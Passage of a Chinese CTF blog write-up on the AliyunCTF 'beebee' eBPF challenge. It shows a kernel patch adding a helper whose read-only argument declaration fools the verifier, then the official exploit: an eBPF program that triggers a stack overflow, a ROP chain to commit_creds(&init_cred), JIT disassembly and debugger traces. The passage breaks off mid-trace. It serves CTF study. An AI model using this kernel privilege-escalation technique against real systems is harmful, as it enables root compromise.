FN(user_ringbuf_drain, 209, ##ctx)\</span><br><span class="line"> FN(cgrp_storage_get, 210, ##ctx)\</span><br><span class="line"> FN(cgrp_storage_delete, 211, ##ctx)\</span><br><span class="line"><span class="addition">+FN(aliyunctf_xor, 212, ##ctx)\</span></span><br><span class="line"> /* */</span><br><span class="line"> </span><br><span class="line"> /* backwards-compatibility macros for users of __BPF_FUNC_MAPPER that don&#x27;t</span><br><span class="line">diff --color -ruN origin/kernel/bpf/helpers.c aliyunctf/kernel/bpf/helpers.c</span><br><span class="line"><span class="comment">--- origin/kernel/bpf/helpers.c2025-01-23 10:21:19.000000000 -0600</span></span><br><span class="line"><span class="comment">+++ aliyunctf/kernel/bpf/helpers.c2025-01-24 03:44:06.683490095 -0600</span></span><br><span class="line"><span class="meta">@@ -1745,6 +1745,28 @@</span></span><br><span class="line"> .arg3_type= ARG_CONST_ALLOC_SIZE_OR_ZERO,</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BPF_CALL_3(bpf_aliyunctf_xor, const char *, buf, size_t, buf_len, s64 *, res) &#123;</span></span><br><span class="line"><span class="addition">+s64 _res = 2025;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+if (buf_len != sizeof(s64))</span></span><br><span class="line"><span class="addition">+return -EINVAL;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+_res ^= *(s64 *)buf;</span></span><br><span class="line"><span class="addition">+*res = _res;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+return 0;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+const struct bpf_func_proto bpf_aliyunctf_xor_proto = &#123;</span></span><br><span class="line"><span class="addition">+.func= bpf_aliyunctf_xor,</span></span><br><span class="line"><span class="addition">+.gpl_only= false,</span></span><br><span class="line"><span class="addition">+.ret_type= RET_INTEGER,</span></span><br><span class="line"><span class="addition">+.arg1_type= ARG_PTR_TO_MEM | MEM_RDONLY,</span></span><br><span class="line"><span class="addition">+.arg2_type= ARG_CONST_SIZE,</span></span><br><span class="line"><span class="addition">+.arg3_type= ARG_PTR_TO_FIXED_SIZE_MEM | MEM_UNINIT | MEM_ALIGNED | MEM_RDONLY,</span></span><br><span class="line"><span class="addition">+.arg3_size= sizeof(s64),</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> const struct bpf_func_proto bpf_get_current_task_proto __weak;</span><br><span class="line"> const struct bpf_func_proto bpf_get_current_task_btf_proto __weak;</span><br><span class="line"> const struct bpf_func_proto bpf_probe_read_user_proto __weak;</span><br><span class="line"><span class="meta">@@ -1801,6 +1823,8 @@</span></span><br><span class="line"> return &amp;bpf_strtol_proto;</span><br><span class="line"> case BPF_FUNC_strtoul:</span><br><span class="line"> return &amp;bpf_strtoul_proto;</span><br><span class="line"><span class="addition">+case BPF_FUNC_aliyunctf_xor:</span></span><br><span class="line"><span class="addition">+return &amp;bpf_aliyunctf_xor_proto;</span></span><br><span class="line"> default:</span><br><span class="line"> break;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>èƒ½çœ‹åˆ°å®ƒæ³¨å†Œäº†ä¸€äº›æ–°çš„ç»“æ„ä½“å’Œå‡½æ•°ï¼Œå¹¶ä¸”ä¼¼ä¹æä¾›äº†ä¸€æ¬¡å†…æ ¸ç©ºé—´å†™å…¥çš„æœºä¼šã€‚é‚£æˆ‘ä»¬æ€ä¹ˆç”¨å‘¢ï¼Ÿä¸‹é¢å°±å¾—çœ‹ä¸‹ebpfæ˜¯ä»€ä¹ˆäº†ã€‚</p><h1>ebpfæ˜¯ä»€ä¹ˆï¼Ÿ</h1><blockquote><p><a href="https://ebpf.io/what-is-ebpf/">https://ebpf.io/what-is-ebpf/</a></p></blockquote><p>ebpfï¼Œå…¨ç§°extended Berkeley Packet Filterï¼Œæ˜¯ä»bpfè¿›åŒ–è€Œæ¥çš„ï¼Œä¸€ä¸ªåœ¨linuxå†…æ ¸ä¸­è¿è¡Œçš„â€œè™šæ‹Ÿæœºâ€ï¼Œå®ƒèƒ½è®¿é—®å†…æ ¸åŠŸèƒ½å’Œå†…å­˜çš„å­é›†ï¼Œåœ¨æ‰€æœ‰çš„å‘è¡Œç‰ˆä¸­éƒ½é»˜è®¤å¼€å¯ã€‚</p><h2 id="åŸç†ï¼Ÿ">åŸç†ï¼Ÿ</h2><p>è¿™ä¸ªä¸œè¥¿æ¯”è¾ƒç‹¬ç‰¹ï¼Œæœ‰äº›ç±»ä¼¼javaï¼ˆå¯¹æ²¡æœ‰å­¦è¿‡javaçš„æœ¬äººæ¥è¯´ç¬¬ä¸€æ¬¡è§ç†è§£ç¡®å®æœ‰éš¾åº¦ï¼‰ã€‚æ•´ä¸ªbpfè™šæ‹Ÿæœºæœ‰è‡ªå·±çš„æŒ‡ä»¤é›†ï¼Œç”¨æˆ·æ€ç”¨ç¼–è¯‘å™¨å°†è‡ªå·±ç¼–å†™çš„Cç¨‹åºç¼–è¯‘æˆ<code>.bpf</code>å­—èŠ‚ç ç¨‹åºï¼Œç„¶åè¿™ä¸ªä¸œè¥¿ä¼šç”¨bpfè°ƒç”¨åŠ è½½å…¥å†…æ ¸ï¼Œç»è¿‡ä¸€æ¬¡å®‰å…¨checkä¹‹å(kernel/bpf/verifier.c)ï¼Œç”¨jitç¼–è¯‘æˆçœŸæ­£çš„å¯æ‰§è¡Œæœºå™¨ç ï¼Œå¹¶ä¸”hookåˆ°ä¸€äº›å†…æ ¸çš„è¿è¡Œè·¯å¾„ä¸Šã€‚è¿™äº›ä»£ç çš„æ•°æ®ä¼šå†™å…¥ringbuffersæˆ–è€…ebpfå•ç‹¬ç®¡ç†çš„kv mapsï¼Œç”¨æˆ·ç©ºé—´ä»ä¸­è¯»å–ç»“æœã€‚<br><img src="images/aliyunctf-beebee%E5%A4%8D%E7%8E%B0.md/image-1.png" alt="ebpf"></p><h2 id="è¾…åŠ©å‡½æ•°-æ¼æ´çš„æœ¬è´¨">è¾…åŠ©å‡½æ•°-æ¼æ´çš„æœ¬è´¨</h2><p>ebpfæä¾›äº†ä¸€å¥—å¯ä»¥æ‰©å±•åŠŸèƒ½çš„æ¨¡å¼ï¼Œé€šè¿‡<code>struct bpf_func_proto</code>æè¿°å®šä¹‰ã€‚</p><p>è¿™äº›è¾…åŠ©å‡½æ•°çš„é€»è¾‘æ˜¯ç”±ç¼–å†™è€…è‡ªå®šä¹‰çš„ï¼Œè¿™äº›è¾…åŠ©å‡½æ•°çš„Cä»£ç å¯ä»¥åœ¨ebpfä¸­å»è°ƒç”¨â€”â€”â€”â€”ä¸å‡ºæ„å¤–çš„è¯å°±è¦å‡ºæ„å¤–äº†ã€‚é¦–å…ˆï¼Œæ‰€æœ‰çš„æ£€æŸ¥éƒ½æ˜¯é’ˆå¯¹bpfå­—èŠ‚ç çš„ï¼Œå¯¹äºå†…å­˜çš„æƒé™æ§åˆ¶æ˜¯ç”±è™šæ‹Ÿæœºç®¡ç†è€Œéæ“ä½œç³»ç»Ÿï¼Œé‚£ä¹ˆå°±äº§ç”Ÿäº†è¿™é“é¢˜ã€‚é€šè¿‡è¾…åŠ©å‡½æ•°çš„æ¶æ„æ“ä½œå†™å…¥ä¸€äº›ebpfä¸­åŸæœ¬è®¤ä¸ºåªè¯»çš„åŒºåŸŸï¼ˆCä»£ç å†™ï¼Œä¸ä¼šè¢«checkï¼‰ï¼Œåœ¨å®Œæˆåebpfå°±ä¸ä¼šå¯¹åŸå…ˆåªè¯»çš„åŒºåŸŸå†checkï¼Œé€ æˆUAFæˆ–æ›´å¤§çš„å±é™©ã€‚æ¢è¨€ä¹‹ï¼Œ<font color=red>bpfçš„æ£€æŸ¥å™¨è·Ÿè¸ªä¸åˆ°è¾…åŠ©å‡½æ•°çš„å†…éƒ¨é€»è¾‘ï¼Œåªä¼šæ ¹æ®æˆ‘ä»¬å‘Šè¯‰å®ƒçš„protoåœ¨bpfç¨‹åºçœŸæ­£æ‰§è¡Œå‰åšcheck</font>ã€‚<strong>è¿™é“é¢˜ç”¨ä¸€ä¸ªevil patchæ¬ºéª—äº†bpfçš„verifierï¼Œå°±è¾¾åˆ°äº†æ”»å‡»çš„ç›®çš„ã€‚</strong></p><h1>åˆ©ç”¨è¿‡ç¨‹</h1><p>åœ¨patchä¸­å®šä¹‰äº†ä¸€ä¸ªè¾…åŠ©å‡½æ•°<code>aliyunctf_xor</code>ï¼Œæ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œä¸€ä¸ªbufï¼Œbuf_lenè¿˜æœ‰ä¸€ä¸ª64ä½çš„æŒ‡é’ˆresã€‚å‡½æ•°å†…ä¼šå°†ä¼ å…¥çš„bufferå†…çš„8å­—èŠ‚å’Œ2025åšå¼‚æˆ–ï¼Œç„¶åå†™å…¥ç¬¬ä¸‰å‚æ•°çš„ä½ç½®ã€‚ä¹ä¸€çœ‹ä¼¼ä¹æ˜¯ä¸€ä¸ª8å­—èŠ‚çš„ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯åœ¨protoä¸­ï¼Œarg3è¢«å£°æ˜ä¸ºäº†åªè¯»ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨ï¼šebpfæŒ‡ä»¤ç¼–å†™">æ¼æ´åˆ©ç”¨ï¼šebpfæŒ‡ä»¤ç¼–å†™</h2><p>ebpfçš„æ±‡ç¼–å­—èŠ‚ç æ˜¯åŸºäºriscæŒ‡ä»¤é›†çš„ã€‚linuxçš„exampleé‡Œæœ‰ä¸€ä¸ªç”¨å®æ‰“åŒ…å¥½çš„ï¼Œå¯è¯»æ€§å¼ºä¸€ç‚¹çš„èƒ½è®©æˆ‘ä»¬åœ¨Cä¸­ç¼–å†™ebpfæ±‡ç¼–çš„<a href="https://github.com/torvalds/linux/blob/master/samples/bpf/bpf_insn.h">å¤´æ–‡ä»¶</a>.</p><p>r0è¿”å›å€¼ï¼Œr1-5ä¼ å‚ï¼Œr6-9é€šç”¨ï¼Œr10åªè¯»å †æ ˆå¯„å­˜å™¨ã€‚8bitçš„æ“ä½œç ï¼ˆ5-3 æœ«å°¾3bitè¡¨ç¤ºæŒ‡ä»¤ç±»å‹ï¼Œè®¿å­˜/è¿ç®—/è·³è½¬ï¼Œé«˜5ä½è¡¨ç¤ºä¸€ä¸ªç±»å‹ä¸‹é¢çš„ä¸åŒçš„å…·ä½“æŒ‡ä»¤ï¼Œåˆ’åˆ†æ–¹æ³•ä¹Ÿä¸åŒï¼‰ï¼Œå…³äºæŒ‡ä»¤æ ¼å¼å’Œæ“ä½œæ–¹æ³•çš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/487995137">è¿™é‡Œ</a></p><p>è¿™äº›å†…å®¹è¢«é€åˆ°å†…æ ¸åä¼šè¢«ç¼–è¯‘æˆå¯ä»¥å®é™…è¿è¡Œçš„æœ¬æœºæ¶æ„æŒ‡ä»¤æ”¾åœ¨ä¸€ä¸ªå†…æ ¸åœ°å€ç©ºé—´ä¸­ã€‚</p><h2 id="å®˜æ–¹wpåšäº†ä»€ä¹ˆï¼Ÿ">å®˜æ–¹wpåšäº†ä»€ä¹ˆï¼Ÿ</h2><p>æˆ‘ä»¬å€’ç€çœ‹ï¼Œæœ€åæ˜¯ä¸€ä¸ªç®€å•çš„ROPã€‚å…ˆçœ‹æœ€åçš„ROPåšäº†ä»€ä¹ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Prepare data for ROP chain</span></span><br><span class="line"><span class="type">char</span> data_buf[<span class="number">4096</span>] = &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">sk_buff</span> <span class="title">md</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *rop_chain = (<span class="type">size_t</span> *)&amp;data_buf[<span class="number">30</span>];</span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff8130d3de</span>; <span class="comment">//  pop rdi; ret;</span></span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff82a52fa0</span>; <span class="comment">//  &amp;init_cred</span></span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff810c3c50</span>; <span class="comment">//  commit_creds</span></span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff8108e620</span>; <span class="comment">//  vfork</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Run prog</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">test_run_attr</span> =</span> &#123;</span><br><span class="line">    .test.data_size_in = <span class="number">1024</span>,</span><br><span class="line">    .test.data_in = (<span class="type">uint64_t</span>)&amp;data_buf,</span><br><span class="line">    .test.ctx_size_in = <span class="keyword">sizeof</span>(md),</span><br><span class="line">    .test.ctx_in = (<span class="type">uint64_t</span>)&amp;md,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">test_run_attr.prog_type = BPF_PROG_TEST_RUN;</span><br><span class="line">test_run_attr.test.prog_fd = prog_fd;</span><br><span class="line"><span class="type">int</span> ret = SYSCHK(syscall(SYS_bpf, BPF_PROG_TEST_RUN, &amp;test_run_attr,</span><br><span class="line">                         <span class="keyword">sizeof</span>(test_run_attr)));</span><br><span class="line"></span><br><span class="line">close(prog_fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get flag</span></span><br><span class="line"><span class="keyword">if</span> (!getuid())</span><br><span class="line">  system(<span class="string">&quot;cat /flag &amp;&amp; whoami &amp;&amp; id&quot;</span>);</span><br></pre></td></tr></table></figure><p>æœ€ååªæ˜¯ç”¨äº†syscall(bpf)ï¼ŒåŠ è½½äº†ä¸€æ®µå†…å®¹ï¼Œæ ‡è®°ä¸ºäº†PROG_TEST_RUNï¼Œè¿™ä¸ªæ ‡è®°æ˜¯å…è®¸ä¸hookä»»ä½•æ‰§è¡Œæµæ¥æ‰§è¡Œbpfä»£ç ï¼Œè¿™é‡Œå°†attr.test.prog_fdé…ç½®æˆäº†ä¸Šæ–‡ä¸­è‡ªå·±å†™çš„ä¸€æ®µbpfä»£ç ï¼Œå°†attr.test.data_iné…ç½®æˆäº†åœ¨30åç§»å¤„å«æœ‰ropé“¾çš„ä¸€ä¸ªbufferã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap-explore 0xffffffffc00006af</span><br><span class="line">             Start                End Perm     Size Offset File (<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line">0xffffffffc0000000 0xffffffffc0200000 rwxp   200000      0 &lt;explored_ffffffffc0000&gt;</span><br></pre></td></tr></table></figure><p>åœ¨bpf_skb_load_bytesæ–­ç‚¹è·Ÿè¿›ï¼Œåœ¨ç¬¬äºŒä¸ªretï¼Œä¹Ÿå°±æ˜¯ä»bpf_skb_load_Byteså‡ºæ¥ä¹‹åï¼Œè§¦å‘äº†ropï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ rsp 0xffffc90000213cd8 â€”â–¸ 0xffffffff8130d3de (fifo_open+206) â—‚â€” 0xffffffff8130d3de</span><br><span class="line">01:0008â”‚     0xffffc90000213ce0 â€”â–¸ 0xffffffff82a52fa0 (init_cred) â—‚â€” 0xffffffff82a52fa0</span><br><span class="line">02:0010â”‚     0xffffc90000213ce8 â€”â–¸ 0xffffffff810c3c50 (commit_creds) â—‚â€” 0xffffffff810c3c50</span><br><span class="line">03:0018â”‚     0xffffc90000213cf0 â€”â–¸ 0xffffffff8108e620 (__x64_sys_vfork) â—‚â€” 0xffffffff8108e620</span><br><span class="line">04:0020â”‚     0xffffc90000213cf8 â—‚â€” 0xffffc90000213cf8</span><br><span class="line">... â†“        3 skipped</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œè¿™ä¸ªretçš„æ‰§è¡Œæµæ¥è‡ªå“ªé‡Œï¼Ÿä¸ºä»€ä¹ˆè¿™é‡Œä¼šè¢«å†™å…¥ï¼Ÿ</p><p>æˆ‘ä»¬åšä¸€ä¸ªå¯¹æ¯”ç¨‹åºï¼ŒæŠŠropé“¾æ³¨é‡Šæ‰æ¥è§‚å¯Ÿã€‚é¦–å…ˆæ˜¯ebpf riscæ±‡ç¼–ä»£ç ç©¶ç«Ÿç¼–è¯‘æˆäº†ä»€ä¹ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Setup evil bpf prog</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// ? R9 = CTX ä¸€èˆ¬çš„èµ·æ‰‹</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line">    <span class="comment">// ? R3 = ELEM</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),  <span class="comment">// stack</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    <span class="comment">// R2 = stack ptr</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),  <span class="comment">// R2 = stack ptr - 16</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),      <span class="comment">// </span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(), <span class="comment">// ? Remove or_null tag</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R6 = P1 (scalar)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R1(buf) = ptr to &lt;value&gt;, which will be set at read-only map</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)), <span class="comment">// ! 256 bytes</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R2(buf_size) = 8</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¸ƒå±€bpf_skb_load_bytesçš„å‚æ•° </span></span><br><span class="line">    <span class="comment">// ? R1 = CTX</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R2 = anything</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R3 = stack</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R4 = size (previously as P1 (scalar), now changed to evil value)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    BPF_EXIT_INSN()&#125;; <span class="comment">// keyï¼Œè¿™æ¡æŒ‡ä»¤ä¼šè¢«JITç¼–è¯‘æˆ</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æ‰€æœ‰çš„riscä»£ç è½¬æˆçš„æœºå™¨ç å†…å®¹ï¼Œå®ƒæ˜¾ç„¶æ˜¯å­˜åœ¨ä¸€äº›ç¼–è¯‘ä¼˜åŒ–å’Œä»£ç å¤ç”¨çš„æœºåˆ¶åœ¨ã€‚ä½†æ˜¯æˆ‘ä»¬èƒ½å¤Ÿçœ‹åˆ°ï¼Œè½¬x86_64ä¹‹åå˜åŠ¨ä¸æ˜¯å¤ªå¤§ï¼Œå‡½æ•°è°ƒç”¨åŸºæœ¬ä¸Šä¹Ÿæ˜¯callåœ°å€ï¼Œè¿™ä¸ªtestç¨‹åºç‰‡æ®µçš„é€€å‡ºæœ€ç»ˆä¹Ÿæ˜¯é çš„671å¤„çš„retæŒ‡ä»¤ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0xffffffffc0000670:  endbr64</span><br><span class="line">   0xffffffffc0000674:  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0xffffffffc0000679:  xchg   ax,ax</span><br><span class="line">   0xffffffffc000067b:  push   rbp</span><br><span class="line">   0xffffffffc000067c:  mov    rbp,rsp</span><br><span class="line">   0xffffffffc000067f:  endbr64</span><br><span class="line">   0xffffffffc0000683:  sub    rsp,0x18</span><br><span class="line">   0xffffffffc000068a:  push   rbx</span><br><span class="line">   0xffffffffc000068b:  push   r13</span><br><span class="line">   0xffffffffc000068d:  push   r15</span><br><span class="line">   0xffffffffc000068f:  mov    r15,rdi</span><br><span class="line">   0xffffffffc0000692:  mov    QWORD PTR [rbp-0x10],0x0</span><br><span class="line">   0xffffffffc000069a:  lfence</span><br><span class="line">   0xffffffffc000069d:  mov    rsi,rbp</span><br><span class="line">   0xffffffffc00006a0:  add    rsi,0xfffffffffffffff0</span><br><span class="line">   0xffffffffc00006a4:  movabs rdi,0xffff8880039c2600</span><br><span class="line">   0xffffffffc00006ae:  add    rdi,0x150</span><br><span class="line">   0xffffffffc00006b5:  mov    eax,DWORD PTR [rsi+0x0]</span><br><span class="line">   0xffffffffc00006b8:  cmp    rax,0x1</span><br><span class="line">   0xffffffffc00006bc:  jae    0xffffffffc00006ca</span><br><span class="line">   0xffffffffc00006be:  and    eax,0x0</span><br><span class="line">   0xffffffffc00006c1:  shl    rax,0x3</span><br><span class="line">   0xffffffffc00006c5:  add    rax,rdi</span><br><span class="line">   0xffffffffc00006c8:  jmp    0xffffffffc00006cc</span><br><span class="line">   0xffffffffc00006ca:  xor    eax,eax</span><br><span class="line">   0xffffffffc00006cc:  <span class="built_in">test</span>   rax,rax</span><br><span class="line">   0xffffffffc00006cf:  jne    0xffffffffc00006d8</span><br><span class="line">   0xffffffffc00006d1:  pop    r15</span><br><span class="line">   0xffffffffc00006d3:  pop    r13</span><br><span class="line">   0xffffffffc00006d5:  pop    rbx</span><br><span class="line">   0xffffffffc00006d6:  leave</span><br><span class="line">   0xffffffffc00006d7:  ret</span><br><span class="line">   0xffffffffc00006d8:  mov    rdx,rax</span><br><span class="line">   0xffffffffc00006db:  mov    r13,rax</span><br><span class="line">   0xffffffffc00006de:  mov    rbx,QWORD PTR [r13+0x0]</span><br><span class="line">   0xffffffffc00006e2:  mov    DWORD PTR [rbp-0x18],0x769</span><br><span class="line">   0xffffffffc00006e9:  lfence</span><br><span class="line">   0xffffffffc00006ec:  mov    DWORD PTR [rbp-0x14],0x0</span><br><span class="line">   0xffffffffc00006f3:  lfence</span><br><span class="line">   0xffffffffc00006f6:  mov    rdi,rbp</span><br><span class="line">   0xffffffffc00006f9:  add    rdi,0xffffffffffffffe8</span><br><span class="line">   0xffffffffc00006fd:  mov    esi,0x8</span><br><span class="line">   0xffffffffc0000702:  call   0xffffffff81208350 &lt;bpf_aliyunctf_xor&gt;</span><br><span class="line">   0xffffffffc0000707:  mov    rdi,r15</span><br><span class="line">   0xffffffffc000070a:  xor    esi,esi</span><br><span class="line">   0xffffffffc000070c:  mov    rdx,rbp</span><br><span class="line">   0xffffffffc000070f:  add    rdx,0xfffffffffffffff8</span><br><span class="line">   0xffffffffc0000713:  mov    rcx,QWORD PTR [r13+0x0]</span><br><span class="line">   0xffffffffc0000717:  call   0xffffffff81c138d0 &lt;bpf_skb_load_bytes&gt;</span><br><span class="line">   0xffffffffc000071c:  jmp    0xffffffffc00006d1</span><br></pre></td></tr></table></figure><p>ä»bpf_test_run+351å¼€å§‹è¿›å…¥æˆ‘ä»¬çš„ç¨‹åºã€‚æˆ‘ä»¬ä»bpf_test_runæ‰“æ–­ç‚¹å¼€å§‹è·Ÿè¸ªï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªç‚¹æ˜¯è¿™é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> â–º <span class="number">0xffffffff81c513df</span> &lt;bpf_test_run+<span class="number">351</span>&gt;    call   <span class="number">0xffffffff81f49480</span>          &lt;__x86_indirect_thunk_array&gt;</span><br><span class="line">        rdi: <span class="number">0xffff88800487bb00</span> â—‚â€” <span class="number">0</span></span><br><span class="line">        rsi: <span class="number">0xffffc9000004d048</span> â—‚â€” <span class="number">0x19bf</span></span><br><span class="line">        rdx: <span class="number">0</span></span><br><span class="line">        rcx: <span class="number">0x1c</span></span><br><span class="line"> </span><br><span class="line">   <span class="number">0xffffffff81c513e4</span> &lt;bpf_test_run+<span class="number">356</span>&gt;    mov    r13d, eax</span><br><span class="line">   <span class="number">0xffffffff81c513e7</span> &lt;bpf_test_run+<span class="number">359</span>&gt;    jmp    <span 